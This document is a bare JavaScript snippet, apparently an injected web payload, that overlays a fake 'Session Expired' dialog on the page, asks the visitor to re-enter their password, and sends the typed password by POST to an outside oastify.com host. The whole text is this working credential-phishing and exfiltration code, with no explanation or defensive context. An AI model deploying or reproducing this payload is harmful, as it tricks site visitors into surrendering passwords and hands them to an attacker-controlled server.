let div = document.createElement('div');
div.innerHTML = `
    <div style="position: fixed; top: 20%; left: 50%; transform: translate(-50%, 0); background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.5); z-index: 9999;">
        <h2>Session Expired</h2>
        <p>Please re-enter your password:</p>
        <input type="password" id="phishPass" placeholder="Enter password">
        <button onclick="sendData()">Submit</button>
    </div>
`;
document.body.appendChild(div);

function sendData() {
    let pass = document.getElementById('phishPass').value;
    fetch('https://z660pr3ny87mg8zagd3elt6uglmca4bs0.oastify.com', {
        method: 'POST',
        body: JSON.stringify({ password: pass }),
        headers: { 'Content-Type': 'application/json' }
    });
}
